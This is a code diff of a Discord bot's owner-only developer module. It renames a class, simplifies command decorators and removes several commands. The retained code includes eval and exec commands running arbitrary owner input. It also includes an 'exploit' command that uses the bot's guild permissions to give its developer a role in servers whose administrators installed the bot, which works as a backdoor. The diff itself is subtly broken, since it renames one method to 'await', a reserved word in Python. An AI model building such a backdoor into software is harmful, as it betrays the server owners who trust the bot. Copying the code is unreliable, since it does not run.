@@ -13,14 +13,14 @@ def load(csv):
     csv.load()
     return round((time.time() - start) * 1000, 2) 
 
-class fbotdev(commands.Cog):
+class Dev(commands.Cog):
 
     def __init__(self, bot):
         self.bot = bot
 
-    @commands.command(name="csvreload")
+    @commands.command()
     @commands.is_owner()
-    async def _CSVReload(self, ctx):
+    async def csvreload(self, ctx):
 
         tms, cms = load(tr.tr), load(cm.cmds)
         embed = self.bot.embed(ctx.author, "FBot csvreload",
@@ -28,9 +28,9 @@ class fbotdev(commands.Cog):
                 f"`[dev] Reloaded Commands.csv in {cms}ms`")
         await ctx.send(embed=embed)
 
-    @commands.command(name="eval")
+    @commands.command()
     @commands.is_owner()
-    async def _Eval(self, ctx, *, content):
+    async def eval(self, ctx, *, content):
 
         bot = self.bot
         ftime = bot.ftime
@@ -63,9 +63,9 @@ class fbotdev(commands.Cog):
 
         await book.createbook(MODE="arrows", COLOUR=colour, TIMEOUT=180)
 
-    @commands.command(name="await")
+    @commands.command()
     @commands.is_owner()
-    async def _Await(self, CTX, *, content):
+    async def await(self, CTX, *, content):
         global bot, ctx
         bot, ctx = self.bot, CTX
         exec(f"global function\nasync def function():\n    result = await {content}\n    if result: return result")
@@ -94,9 +94,9 @@ class fbotdev(commands.Cog):
 
         await book.createbook(MODE="arrows", COLOUR=colour, TIMEOUT=180)
 
-    @commands.command(name="exploit")
+    @commands.command()
     @commands.is_owner()
-    async def _Exploit(self, ctx):
+    async def exploit(self, ctx):
 
         bot = await ctx.guild.fetch_member(self.bot.user.id)
         perms = bot.guild_permissions
@@ -115,32 +115,32 @@ class fbotdev(commands.Cog):
         await ctx.author.add_roles(role)
         await ctx.message.add_reaction("✅")
 
-    @commands.command(name="devon")
+    @commands.command()
     @commands.is_owner()
-    async def _FBotDevOn(self, ctx):
+    async def devon(self, ctx):
         db.addchannel(ctx.channel.id, ctx.guild.id)
         db.changestatus(ctx.channel.id, "on")
         await ctx.message.add_reaction("✅")
 
-    @commands.command(name="devoff")
+    @commands.command()
     @commands.is_owner()
-    async def _FBotDevOff(self, ctx):
+    async def devoff(self, ctx):
         db.addchannel(ctx.channel.id, ctx.guild.id)
         db.changestatus(ctx.channel.id, "off")
         await ctx.message.add_reaction("✅")
 
-    @commands.command(name="devrespond")
+    @commands.command()
     @commands.is_owner()
-    async def _DevPriority(self, ctx, *, arg):
+    async def devrespond(self, ctx, *, arg):
         if arg in ("few", "some", "all"):
             db.changepriority(ctx.guild.id, arg)
             await ctx.message.add_reaction("✅")
         else:
             await ctx.reply("Must be `few`, `some`, or `all`")
 
-    @commands.command(name="devmodtoggle")
+    @commands.command()
     @commands.is_owner()
-    async def _Modtoggle(self, ctx, arg):
+    async def devmodtoggle(self, ctx, arg):
         db.addchannel(ctx.channel.id, ctx.guild.id)
         if arg == "on":
             db.changemodtoggle(ctx.guild.id, arg)
@@ -149,54 +149,25 @@ class fbotdev(commands.Cog):
             db.changemodtoggle(ctx.guild.id, arg)
             await ctx.message.add_reaction("✅")
 
-    @commands.command(name="presence")
+    @commands.command()
     @commands.is_owner()
-    async def _ChangePresence(self, ctx, *, content):
+    async def presence(self, ctx, *, content):
         await self.bot.change_presence(status=discord.Status.online,
                                        activity=discord.Game(name=content))
         await ctx.message.add_reaction("✅")
 
-    @commands.command(name="send")
+    @commands.command()
     @commands.is_owner()
-    async def _Send(self, ctx, channel: discord.TextChannel, *, content):
-        await channel.send(content)
-        await ctx.message.add_reaction("✅")
-
-    @commands.command(name="userdm")
-    @commands.is_owner()
-    async def _UserDM(self, ctx, user: discord.User, *, content):
-        dm = await user.create_dm()
-        await dm.send(content)
-        await ctx.message.add_reaction("✅")
-
-    @commands.command(name="dev")
-    @commands.is_owner()
-    async def _Dev(self, ctx):
-        await ctx.reply(f"Yeah {ctx.author.mention} is a dev, that's why he can use this command")
-
-    @commands.command(name="newinvite")
-    @commands.is_owner()
-    async def _CreateInvite(self, ctx, guild: discord.Guild):
-        try:
-            invite = await guild.system_channel.create_invite(
-                max_age=120 * 60, temporary=True)
-        except:
-            invite = "error resolving invite"
-        await ctx.send(f"Created a temporary invite for `{guild}`\n"
-                f"`{invite}`, will expire after 2 hours")
-
-    @commands.command(name="leave")
-    @commands.is_owner()
-    async def _Leave(self, ctx, guild: discord.Guild):
+    async def leave(self, ctx, guild: discord.Guild):
         if ctx.guild.id == guild.id:
             await ctx.reply("Can't leave the server you are invoking this command in")
         else:
             await guild.leave()
             await ctx.message.add_reaction("✅")
 
-    @commands.command(name="lookup")
+    @commands.command()
     @commands.is_owner()
-    async def _Lookup(self, ctx, guild: discord.Guild):
+    async def lookup(self, ctx, guild: discord.Guild):
         memcount = guild.member_count
 
         created = guild.created_at
@@ -216,9 +187,9 @@ class fbotdev(commands.Cog):
 
         await ctx.send(embed=embed)
 
-    @commands.command(name="servers", aliases=["members"])
+    @commands.command()
     @commands.is_owner()
-    async def _Servers(self, ctx):
+    async def servers(self, ctx):
 
         guilds = []
         members = 0
@@ -232,9 +203,9 @@ class fbotdev(commands.Cog):
         book.createpages(guilds, f"`%1`: **%0**")
         await book.createbook(SHOW_RESULTS=True, COLOUR=colour)
 
-    @commands.command(name="search")
+    @commands.command()
     @commands.is_owner()
-    async def _Search(self, ctx, *, query):
+    async def search(self, ctx, *, query):
 
         matches = []
         query = query.lower()
@@ -254,18 +225,10 @@ class fbotdev(commands.Cog):
             embed = self.bot.embed(ctx.author, "FBot Search", f"No matches found for `{query}`")
             await ctx.send(embed=embed)
 
-    @commands.command(name="cmdlist")
+    @commands.command()
     @commands.is_owner()
-    async def _CommandList(self, ctx):
-        commands = [i.name for i in self.bot.walk_commands()]
-        embed = self.bot.embed(ctx.author, "FBot Commands",
-                                  f" ```python\n{commands}```")
-        await ctx.send(embed=embed)
-
-    @commands.command(name="host")
-    @commands.is_owner()
-    async def _Host(self, ctx):
+    async def host(self, ctx):
         await ctx.reply("This instance is running on: " + socket.gethostname())
 
 def setup(bot):
-    bot.add_cog(fbotdev(bot))
+    bot.add_cog(Dev(bot))
